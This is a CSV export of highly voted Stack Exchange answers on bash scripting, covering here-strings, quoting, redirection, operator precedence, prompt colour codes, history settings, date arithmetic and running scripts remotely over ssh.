Title,Id,Tags,Score,Body
"What does <<< mean?","80362","<bash><command-line><sed><command>","164","<p>Others have answered the basic question: what is it?
Let's look at why it's useful.</p>

<p>You can also feed a string to a command's stdin like this:</p>

<pre><code>echo ""$string"" | command
</code></pre>

<p>However in bash, introducing a pipe means the individual commands are run in subshells. Consider this:</p>

<pre><code>echo ""hello world"" | read first second
echo $second $first
</code></pre>

<p>The output of the 2nd echo command prints just a single space. Whaaaa? What happened to my variables? Because the read command is in a pipeline, it is run in a subshell. It correctly reads 2 words from its stdin and assigns to the variables. But then the command completes, <em>the subshell exits</em> and the variables are lost. </p>

<p>Sometimes you can work around this with braces:</p>

<pre><code>echo ""hello world"" | {
    read first second
    echo $second $first
}
</code></pre>

<p>That's OK if your need for the values is contained, but you still don't have those variables in the current shell of your script.
To remedy this confusing situation, use a here-string</p>

<pre><code>read first second &lt;&lt;&lt; ""hello world""
echo $second $first
</code></pre>

<p>Ah, much better!</p>
"
"Quoting within $(command substitution) in Bash","118433","<bash><shell><quoting><command-substitution>","163","<p>
In order from worst to best:</p>

<ul>
<li><code>DIRNAME=""$(dirname $FILE)""</code> <a href=""https://mywiki.wooledge.org/Quotes"" rel=""noreferrer"">will not do what you want</a> if <code>$FILE</code> contains whitespace or globbing characters <code>\[?*</code>.</li>
<li><code>DIRNAME=`dirname ""$FILE""`</code> is technically correct, but <a href=""https://mywiki.wooledge.org/BashFAQ/082"" rel=""noreferrer"">backticks are not recommended for command expansion</a> because of the extra complexity when nesting them.</li>
<li><code>DIRNAME=$(dirname ""$FILE"")</code> is correct, but <a href=""https://mywiki.wooledge.org/BashPitfalls#for_i_in_.24.28ls_.2A.mp3.29/BashPitfalls#for_i_in_.24.28ls_.2A.mp3.29"" rel=""noreferrer"">only because this is an assignment</a>. If you use the command substitution in any other context, such as <code>export DIRNAME=$(dirname ""$FILE"")</code> or <code>du $(dirname ""$FILE"")</code>, the lack of quotes will cause trouble if the result of the expansion contain whitespace or globbing characters.</li>
<li><code>DIRNAME=""$(dirname ""$FILE"")""</code> is the recommended way. You can replace <code>DIRNAME=</code> with a command and a space without changing anything else, and <code>dirname</code> receives the correct string.</li>
</ul>

<p>To improve even further:</p>

<ul>
<li><code>DIRNAME=""$(dirname -- ""$FILE"")""</code> works if <code>$FILE</code> starts with a dash.</li>
<li><code>DIRNAME=""$(dirname -- ""$FILE""; printf x)"" &amp;&amp; DIRNAME=""${DIRNAME%?x}""</code> works even if <code>$FILE</code> ends with a newline, since <code>$()</code> chops off newlines at the end of output and <code>dirname</code> outputs a newline after the result. Sheesh <code>dirname</code>, why you gotta be different?</li>
</ul>

<p>You can nest command expansions as much as you like. With <code>$()</code> you always create a new quoting context, so you can do things like this:</p>

<pre class=""lang-sh prettyprint-override""><code>foo ""$(bar ""$(baz ""$(ban ""bla"")"")"")""
</code></pre>

<p>You do <em>not</em> want to try that with backticks.</p>
"
"Can I redirect output to a log file and background a process at the same time?","74520","<bash><shell><shell-script>","161","<p>One problem with your first command is that you redirect stderr to where stdout is (if you changed the $ to a &amp; as suggested in the comment) and then, you redirected stdout to some log file, but that does not pull along the redirected stderr. You must do it in the other order, first send stdout to where you want it to go, and then send stderr to the address stdout is at</p>

<pre><code>some_cmd &gt; some_file 2&gt;&amp;1 &amp;
</code></pre>

<p>and then you could throw the &amp; on to send it to the background. Jobs can be accessed with the <code>jobs</code> command. <code>jobs</code> will show you the running jobs, and number them. You could then talk about the jobs using a % followed by the number like <code>kill %1</code> or so.  </p>

<p>Also, without the &amp; on the end you can suspend the command with <kbd>Ctrl</kbd><kbd>z</kbd>, use the <code>bg</code> command to put it in the background and <code>fg</code> to bring it back to the foreground.  In combination with the <code>jobs</code> command, this is powerful.</p>

<p>to clarify the above part about the order you write the commands. Suppose stderr is address 1002, stdout is address 1001, and the file is 1008. The command reads left to right, so the first thing it sees in yours is <code>2&gt;&amp;1</code> which moves stderr to the address 1001, it then sees <code>&gt; file</code> which moves stdout to 1008, but keeps stderr at 1001. It does not pull everything pointing at 1001 and move it to 1008, but simply references stdout and moves it to the file.<br>
The other way around, it moves stdout to 1008, and then moves stderr to the point that stdout is pointing to, 1008 as well. This way both can point to the single file.</p>
"
"remove particular characters from a variable using bash","104881","<bash><text-processing>","160","<p>There is no need to execute an external program. <code>bash</code>'s <a href=""http://tldp.org/LDP/abs/html/string-manipulation.html"" rel=""noreferrer"">string manipulation</a> can handle it (also available in <code>ksh93</code> (where it comes from), <code>zsh</code> and recent versions of <code>mksh</code>, <code>yash</code> and busybox <code>sh</code> (at least)):</p>

<pre><code>$ VERSION='2.3.3'
$ echo ""${VERSION//.}""
233
</code></pre>

<p>(In those shells' manuals you can generally find this in the <em>parameter expansion</em> section.)</p>
"
"Bash: What does "">|"" do?","45201","<bash><io-redirection><pipe>","160","<p>It's not useless - it's a specialised form of the plain <code>&gt;</code> redirect operator (and, perhaps confusingly, nothing to do with pipes). <code>bash</code> and most other modern shells have an option <code>noclobber</code>, which prevents redirection from overwriting or destroying a file that already exists. For example, if <code>noclobber</code> is true, and the file <code>/tmp/output.txt</code> already exists, then this should fail:</p>

<pre><code>$ some-command &gt; /tmp/output.txt
</code></pre>

<p>However, you can explicitly override the setting of <code>noclobber</code> with the <code>&gt;|</code> redirection operator - the redirection will work, even if <code>noclobber</code> is set.</p>

<p>You can find out if <code>noclobber</code> is set in your current environment with <code>set -o</code>.</p>

<p>For the historical note, both the ""noclobber"" option and its bypass features come from <code>csh</code> (late 70s). <code>ksh</code> copied it (early 80s) but used <code>&gt;|</code> instead of <code>&gt;!</code>. POSIX specified the <code>ksh</code> syntax (so all POSIX shells including bash, newer ash derivatives used as sh on some systems support it). Zsh supports both syntaxes. I don't think it was added to any Bourne shell variant but I might be wrong.</p>
"
"Precedence of the shell logical operators &&, ||","88850","<bash><shell>","160","<p>In many computer languages, operators with the same precedence are <a href=""http://en.wikipedia.org/wiki/Operator_associativity"">left-associative</a>. That is, in the absence of grouping structures, leftmost operations are executed first. Bash is <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Lists"">no exception</a> to this rule.</p>

<p>This is important because, in Bash, <code>&amp;&amp;</code> and <code>||</code> have the same precedence.</p>

<p>So what happens in your example is that the leftmost operation (<code>||</code>) is carried out first:</p>

<pre><code>true || echo aaa
</code></pre>

<p>Since <code>true</code> is obviously true, the <code>||</code> operator short-circuits and the whole statement is considered true without the need to evaluate <code>echo aaa</code> as you would expect. Now it remains to do the rightmost operation:</p>

<pre><code>(...) &amp;&amp; echo bbb
</code></pre>

<p>Since the first operation evaluated to true (i.e. had a 0 exit status), it's as if you're executing</p>

<pre><code>true &amp;&amp; echo bbb
</code></pre>

<p>so the <code>&amp;&amp;</code> will not short-circuit, which is why you see <code>bbb</code> echoed.</p>

<p>You would get the same behavior with</p>

<pre><code>false &amp;&amp; echo aaa || echo bbb
</code></pre>

<p><strong>Notes based on the comments</strong></p>

<ul>
<li>You should note that the left-associativity rule is <em>only</em> followed when both operators have <em>the same</em> precedence. This is not the case when you use these operators in conjunction with keywords such as <code>[[...]]</code> or <code>((...))</code> or use the <code>-o</code> and <code>-a</code> operators as arguments to the <code>test</code> or <code>[</code> commands. In such cases, AND (<code>&amp;&amp;</code> or <code>-a</code>) takes precedence over OR (<code>||</code> or <code>-o</code>). Thanks to Stephane Chazelas' comment for clarifying this point.</li>
<li><p>It seems that <a href=""http://www.difranco.net/compsci/C_Operator_Precedence_Table.htm"">in C</a> and C-like languages <code>&amp;&amp;</code> has higher precedence than <code>||</code> which is probably why you expected your original construct to behave like </p>

<pre><code>true || (echo aaa &amp;&amp; echo bbb). 
</code></pre>

<p>This is not the case with Bash, however, in which both operators have the same precedence, which is why Bash parses your expression using the left-associativity rule. Thanks to Kevin's comment for bringing this up.</p></li>
<li><p>There might also be cases where <em>all 3</em> expressions are evaluated. If the first command returns a non-zero exit status, the <code>||</code> won't short circuit and goes on to execute the second command. If the second command returns with a zero exit status, then the <code>&amp;&amp;</code> won't short-circuit as well and the third command will be executed. Thanks to Ignacio Vazquez-Abrams' comment for bringing this up.</p></li>
</ul>
"
"What color codes can I use in my PS1 prompt?","124407","<bash><colors><prompt>","160","<p>Those are <a href=""http://en.wikipedia.org/wiki/ANSI_escape_code#Colors"" rel=""noreferrer"">ANSI escape sequences</a>; that link is to a chart of color codes but there are other interesting things on that Wikipedia page as well.  Not all of them work on (e.g.) a normal Linux console.</p>

<p>This is incorrect:</p>

<blockquote>
  <p><code>\033]00m\]   # white</code></p>
</blockquote>

<p><code>0</code> resets the terminal to its default (which is probably white).  The actual code for white foreground is 37.  Also, the escaped closing brace at the end (<code>\]</code>) is not part of the color sequence (see the last few paragraphs below for an explanation of their purpose in setting a prompt).</p>

<p>Note that some GUI terminals allow you to specify a customized color scheme. This will affect the output.</p>

<p>There's <a href=""http://misc.flogisoft.com/bash/tip_colors_and_formatting"" rel=""noreferrer"">a list here</a> which adds 7 foreground and 7 background colors I had not seen before, but they seem to work:</p>

<pre><code># Foreground colors
90   Dark gray  
91   Light red  
92   Light green    
93   Light yellow   
94   Light blue 
95   Light magenta  
96   Light cyan  

# Background colors
100  Dark gray  
101  Light red  
102  Light green    
103  Light yellow   
104  Light blue 
105  Light magenta  
106  Light cyan 
</code></pre>

<p>In addition, if you have a 256 color GUI terminal (I think most of them are now), you can apply colors from this chart: </p>

<p><img src=""https://i.stack.imgur.com/UQVe5.png"" alt=""xterm  256 color chart""></p>

<p>The ANSI sequence to select these, using the number in the bottom left corner, starts <code>38;5;</code> for the foreground and <code>48;5;</code> for the background, then the color number, so e.g.:</p>

<pre><code>echo -e ""\\033[48;5;95;38;5;214mhello world\\033[0m""
</code></pre>

<p>Gives me a light orange on tan (meaning, the color chart is roughly approximated).</p>

<p>You can see the colors in this chart<sup>1</sup> as they would appear on your terminal fairly easily:</p>

<pre><code>#!/bin/bash

color=16;

while [ $color -lt 245 ]; do
    echo -e ""$color: \\033[38;5;${color}mhello\\033[48;5;${color}mworld\\033[0m""
    ((color++));
done  
</code></pre>

<p>The output is self-explanatory.  </p>

<p>Some systems set the $TERM variable to <code>xterm-256color</code> if you are on a 256 color terminal via some shell code in <code>/etc/profile</code>.  On others, you should be able to configure your terminal to use this.  That will let TUI applications know there are 256 colors, and allow you to add something like this to your <code>~/.bashrc</code>:</p>

<pre><code>if [[ ""$TERM"" =~ 256color ]]; then
     PS1=""MyCrazyPrompt...""
fi
</code></pre>

<p>Beware that when you use color escape sequences in your prompt, you should enclose them in escaped (<code>\</code> prefixed) square brackets, like this:</p>

<pre><code>PS1=""\[\033[01;32m\]MyPrompt: \[\033[0m\]""
</code></pre>

<p>Notice the <code>[</code>'s interior to the color sequence are not escaped, but the enclosing ones are.  The purpose of the latter is to indicate to the shell that the enclosed sequence does not count toward the character length of the prompt.  If that count is wrong, weird things will happen when you scroll back through the history, e.g., if it is too long, the excess length of the last scrolled string will appear attached to your prompt and you won't be able to backspace into it (it's ignored the same way the prompt is).</p>

<p>Also note that if you want to include the output of a command run every time the prompt is used (as opposed to just once when the prompt is set), you should set it as a literal string with single quotes, e.g.:</p>

<pre><code>PS1='\[\033[01;32m\]$(date): \[\033[0m\]'
</code></pre>

<p>Although this is not a great example if you are happy with using bash's special <code>\d</code> or <code>\D{format}</code> prompt escapes -- which are not the topic of the question but can be found in <code>man bash</code> under <code>PROMPTING</code>.  There are various other useful escapes such as <code>\w</code> for current directory, <code>\u</code> for current user, etc.</p>

<hr>

<p><sup>1. The main portion of this chart, colors 16 - 231 (notice they are not in numerical order) are a 6 x 6 x 6 RGB color cube. ""Color cube"" refers to the fact that an RGB color space can be represented using a three dimensional array (with one axis for red, one for green, and one for blue).  Each color in the cube here can be represented as coordinates in a 6 x 6 x 6 array, and the index in the chart calculated thusly:</sup></p>

<pre><code>    16 + R * 36 + G * 6 + B
</code></pre>

<p><sup>The first color in the cube, at index 16 in the chart, is black (RGB 0, 0, 0).  You could use this formula in shell script:</sup></p>

<pre><code>#!/bin/sh                                                         

function RGBcolor {                                               
    echo ""16 + $1 * 36 + $2 * 6 + $3"" | bc                        
}                                                                 

fg=$(RGBcolor 1 0 2)  # Violet                                            
bg=$(RGBcolor 5 3 0)  # Bright orange.                                            

echo -e ""\\033[1;38;5;$fg;48;5;${bg}mviolet on tangerine\\033[0m""
</code></pre>
"
"Are there naming conventions for variables in shell scripts?","42847","<bash><shell-script><shell><variable>","158","<p>Environment variables or shell variables that are introduced by the operating system, shell startup scripts, or by the shell itself etc. are usually all in <code>CAPITALS</code>.</p>

<p>To prevent your own variables from conflicting with these variables, it is a good practice to use <code>lower_case</code> variable names.</p>
"
"How to uppercase the command line argument?","51983","<bash><string><case-sensitivity>","152","<p>The syntax <code>str^^</code> which you are trying is available from Bash 4.0 and above. Perhaps yours is an older version (or you ran the script with <code>sh</code> explicitly):</p>

<p>Try this:</p>

<pre><code>str=""Some string""
printf '%s\n' ""$str"" | awk '{ print toupper($0) }'
</code></pre>
"
"Temporarily suspend bash_history on a given shell?","10922","<bash><command-history>","146","<p>This should be what you're looking for:</p>

<pre><code>unset HISTFILE
</code></pre>

<h3>From <code>man bash</code></h3>

<blockquote>
  <p>If HISTFILE is unset, or if the history file is unwritable, the history is not saved.</p>
</blockquote>

<p>Alternatively, if you want to toggle it off and then back on again, it may be easier to use <a href=""https://ss64.com/bash/set.html"" rel=""noreferrer""><code>set</code></a>:</p>

<h3>Turn Off</h3>

<pre><code>set +o history
</code></pre>

<h3>Turn on</h3>

<pre><code>set -o history
</code></pre>
"
"How do I add X days to date and get new date?","49053","<linux><bash><shell-script><date>","142","<p>You can just use the <code>-d</code> switch and provide a date to be calculated</p>

<pre><code>date
Sun Sep 23 08:19:56 BST 2012
NEW_expration_DATE=$(date -d ""+10 days"")
echo $NEW_expration_DATE
Wed Oct 3 08:12:33 BST 2012 
</code></pre>

<blockquote>
<pre><code>  -d, --date=STRING
          display time described by STRING, not ‘now’
</code></pre>
</blockquote>

<p>This is quite a powerful tool as you can do things like </p>

<pre><code>date -d ""Sun Sep 11 07:59:16 IST 2012+10 days""
Fri Sep 21 03:29:16 BST 2012
</code></pre>

<p>or</p>

<pre><code>TZ=IST date -d ""Sun Sep 11 07:59:16 IST 2012+10 days""
Fri Sep 21 07:59:16 IST 2012
</code></pre>

<p>or</p>

<pre><code>prog_end_date=`date '+%C%y%m%d' -d ""$end_date+10 days""`
</code></pre>

<p>So if $end_date=20131001 then $prog_end_date=20131011</p>
"
"When is double-quoting necessary?","68694","<bash><shell><shell-script><zsh><quoting>","139","<p>First, separate zsh from the rest. It's not a matter of old vs modern shells: zsh behaves differently. The zsh designers decided to make it incompatible with traditional shells (Bourne, ksh, bash), but easier to use.</p>

<p>Second, it is far easier to use double quotes all the time than to remember when they are needed. They are needed most of the time, so you'll need to learn when they aren't needed, not when they are needed.</p>

<p>In a nutshell, <strong>double quotes are necessary wherever a list of words or a pattern is expected</strong>. They are optional in contexts where a raw string is expected by the parser.</p>

<h3>What happens without quotes</h3>

<p>Note that without double quotes, two things happen.</p>

<ol>
<li>First, the result of the expansion (the value of the variable for a parameter substitution like <code>${foo}</code>, or the output of the command for a command substitution like <code>$(foo)</code>) is split into words wherever it contains whitespace.<br>
More precisely, the result of the expansion is split at each character that appears in the value of the <code>IFS</code> variable (separator character). If a sequence of separator characters contains whitespace (space, tab or newline), the whitespace is counts as a single character; leading, trailing or repeated non-whitespace separators lead to empty fields. For example, with <code>IFS="" :""</code>, <code>:one::two : three: :four </code> produces empty fields before <code>one</code>, between <code>one</code> and <code>two</code>, and (a single one) between <code>three</code> and <code>four</code>.</li>
<li>Each field that results from splitting is interpreted as a glob (a wildcard pattern) if it contains one of the characters <code>\[*?</code>. If that pattern matches one or more file names, the pattern is replaced by the list of matching file names.</li>
</ol>

<p>An unquoted variable expansion <code>$foo</code> is colloquially known as the “split+glob operator”, in contrast with <code>""$foo""</code> which just takes the value of the variable <code>foo</code>. The same goes for command substitution: <code>""$(foo)""</code> is a command substitution, <code>$(foo)</code> is a command substitution followed by split+glob.</p>

<h3>Where you can omit the double quotes</h3>

<p>Here are all the cases I can think of in a Bourne-style shell where you can write a variable or command substitution without double quotes, and the value is interpreted literally.</p>

<ul>
<li><p>On the right-hand side of an assignment.</p>

<pre><code>var=$stuff
a_single_star=*
</code></pre>

<p>Note that you do need the double quotes after <code>export</code>, because it's an ordinary builtin, not a keyword. This is only true in some shells such as dash, zsh (in sh emulation), yash or posh; bash and ksh both treat <code>export</code> specially.</p>

<pre><code>export VAR=""$stuff""
</code></pre></li>
<li><p>In a <code>case</code> statement.</p>

<pre><code>case $var in …
</code></pre>

<p>Note that you do need double quotes in a case pattern. Word splitting doesn't happen in a case pattern, but an unquoted variable is interpreted as a pattern whereas a quoted variable is interpreted as a literal string.</p>

<pre><code>a_star='a*'
case $var in
  ""$a_star"") echo ""'$var' is the two characters a, *"";;
   $a_star) echo ""'$var' begins with a"";;
esac
</code></pre></li>
<li><p>Within double brackets. Double brackets are shell special syntax.</p>

<pre><code>[[ -e $filename ]]
</code></pre>

<p>Except that you do need double quotes where a pattern or regular expression is expected: on the right-hand side of <code>=</code> or <code>==</code> or <code>!=</code> or <code>=~</code>.</p>

<pre><code>a_star='a*'
if [[ $var == ""$a_star"" ]]; then echo ""'$var' is the two characters a, *""
elif [[ $var == $a_star ]]; then echo ""'$var' begins with a""
fi
</code></pre>

<p>You do need double quotes as usual within single brackets <code>[ … ]</code> because they are ordinary shell syntax (it's a command that happens to be called <code>[</code>). See <a href=""https://unix.stackexchange.com/questions/32210/using-single-or-double-bracket-bash/32227#32227"">Single or double brackets</a></p></li>
<li><p>In a redirection in non-interactive POSIX shells (not <code>bash</code>, nor <code>ksh88</code>).</p>

<pre><code>echo ""hello world"" &gt;$filename
</code></pre>

<p>Some shells, when interactive, do treat the value of the variable as a wildcard pattern. POSIX prohibits that behaviour in non-interactive shells, but a few shells including bash (except in POSIX mode) and ksh88  (including when found as the (supposedly) POSIX <code>sh</code> of some commercial Unices like Solaris) still do it there (<code>bash</code> does also attempt <em>splitting</em> and the redirection fails unless that <em>split+globbing</em> results in exactly one word), which is why it's better to quote targets of redirections in a <code>sh</code> script in case you want to convert it to a <code>bash</code> script some day, or run it on a system where <code>sh</code> is non-compliant on that point, or it may be <em>sourced</em> from interactive shells.</p></li>
<li><p>Inside an arithmetic expression. In fact, you need to leave the quotes out in order for a variable to be parsed as an arithmetic expression.</p>

<pre><code>expr=2*2
echo ""$(($expr))""
</code></pre>

<p>However, you do need the quotes around the arithmetic expansion as they are subject to word splitting in most shells as POSIX requires (!?).</p></li>
<li><p>In an associative array subscript.</p>

<pre><code>typeset -A a
i='foo bar*qux'
a[foo\ bar\*qux]=hello
echo ""${a[$i]}""
</code></pre></li>
</ul>

<p>An unquoted variable and command substitution can be useful in some rare circumstances:</p>

<ul>
<li>When the variable value or command output consists of a list of glob patterns and you want to expand these patterns to the list of matching files.</li>
<li>When you know that the value doesn't contain any wildcard character, that <code>$IFS</code> was not modified and you want to split it at whitespace characters.</li>
<li>When you want to split a value at a certain character: disable globbing with <code>set -f</code>, set <code>IFS</code> to the separator character (or leave it alone to split at whitespace), then do the expansion.</li>
</ul>

<h3>Zsh</h3>

<p>In zsh, you can omit the double quotes most of the times, with a few exceptions.</p>

<ul>
<li><p><code>$var</code> never expands to multiple words, however it expands to the empty list (as opposed to a list containing a single, empty word) if the value of <code>var</code> is the empty string. Contrast:</p>

<pre><code>var=
print -l $var foo        # prints just foo
print -l ""$var"" foo      # prints an empty line, then foo
</code></pre>

<p>Similarly, <code>""${array[@]}""</code> expands to all the elements of the array, while <code>$array</code> only expands to the non-empty elements.</p></li>
<li><p>The <code>@</code> parameter expansion flag sometimes requires double quotes around the whole substitution: <code>""${(@)foo}""</code>.</p></li>
<li><p>Command substitution undergoes field splitting if unquoted: <code>echo $(echo 'a'; echo '*')</code> prints <code>a *</code> (with a single space) whereas <code>echo ""$(echo 'a'; echo '*')""</code> prints the unmodified two-line string. Use <code>""$(somecommand)""</code> to get the output of the command in a single word, sans final newlines. Use <code>""${$(somecommand; echo _)%?}""</code> to get the exact output of the command including final newlines. Use <code>""${(@f)$(somecommand)}""</code> to get an array of lines from the command's output.</p></li>
</ul>
"
"How can I execute local script on remote machine and include arguments?","87405","<bash><shell-script><shell><scripting><options>","138","<p>You were pretty close with your example. It works just fine when you use it with arguments such as these.</p>

<p><em><strong>Sample script:</em></strong></p>

<pre><code>$ more ex.bash 
#!/bin/bash

echo $1 $2
</code></pre>

<p><em><strong>Example that works:</em></strong></p>

<pre><code>$ ssh serverA ""bash -s"" &lt; ./ex.bash ""hi"" ""bye""
hi bye
</code></pre>

<p>But it fails for these types of arguments:</p>

<pre><code>$ ssh serverA ""bash -s"" &lt; ./ex.bash ""--time"" ""bye""
bash: --: invalid option
...
</code></pre>

<h3>What's going on?</h3>

<p>The problem you're encountering is that the argument, <code>-time</code>, or <code>--time</code> in my example, is being interpreted as a switch to <code>bash -s</code>. You can pacify <code>bash</code> by terminating it from taking any of the remaining command line arguments for itself using the <code>--</code> argument.</p>

<p>Like this:</p>

<pre><code>$ ssh root@remoteServer ""bash -s"" -- &lt; /var/www/html/ops1/sysMole -time Aug 18 18
</code></pre>

<h3>Examples</h3>

<p><em>#1:</em></p>

<pre><code>$ ssh serverA ""bash -s"" -- &lt; ./ex.bash ""-time"" ""bye""
-time bye
</code></pre>

<p><em>#2:</em></p>

<pre><code>$ ssh serverA ""bash -s"" -- &lt; ./ex.bash ""--time"" ""bye""
--time bye
</code></pre>

<p><em>#3:</em></p>

<pre><code>$ ssh serverA ""bash -s"" -- &lt; ./ex.bash --time ""bye""
--time bye
</code></pre>

<p><em>#4:</em></p>

<pre><code>$ ssh  &lt; ./ex.bash serverA ""bash -s -- --time bye""
--time bye
</code></pre>

<p><strong>NOTE:</strong> Just to make it clear that wherever the redirection appears on the command line makes no difference, because <code>ssh</code> calls a remote shell with the concatenation of its arguments anyway, quoting doesn't make much difference, except when you need quoting on the remote shell like in example <em>#4:</em></p>

<pre><code>$ ssh  &lt; ./ex.bash serverA ""bash -s -- '&lt;--time bye&gt;' '&lt;end&gt;'""
&lt;--time bye&gt; &lt;end&gt;
</code></pre>
"
"What is the difference between ""sort -u"" and ""sort | uniq""?","76049","<bash><sort><uniq>","138","<p><code>sort | uniq</code> existed before <code>sort -u</code>, and is compatible with a wider range of systems, although almost all modern systems do support <code>-u</code> -- it's POSIX. It's mostly a throwback to the days when <code>sort -u</code> didn't exist (and people don't tend to change their methods if the way that they know continues to work, just look at <code>ifconfig</code> vs. <code>ip</code> adoption).</p>

<p>The two were likely merged because removing duplicates within a file requires sorting (at least, in the standard case), and is an extremely common use case of sort. It is also faster internally as a result of being able to do both operations at the same time (and due to the fact that it doesn't require IPC between <code>uniq</code> and <code>sort</code>). Especially if the file is big, <code>sort -u</code> will likely use fewer intermediate files to sort the data.</p>

<p>On my system I consistently get results like this:</p>

<pre><code>$ dd if=/dev/urandom of=/dev/shm/file bs=1M count=100
100+0 records in
100+0 records out
104857600 bytes (105 MB) copied, 8.95208 s, 11.7 MB/s
$ time sort -u /dev/shm/file &gt;/dev/null

real        0m0.500s
user        0m0.767s
sys         0m0.167s
$ time sort /dev/shm/file | uniq &gt;/dev/null

real        0m0.772s
user        0m1.137s
sys         0m0.273s
</code></pre>

<p>It also doesn't mask the return code of <code>sort</code>, which may be important (in modern shells there are ways to get this, for example, <code>bash</code>'s <code>$PIPESTATUS</code> array, but this wasn't always true).</p>
"
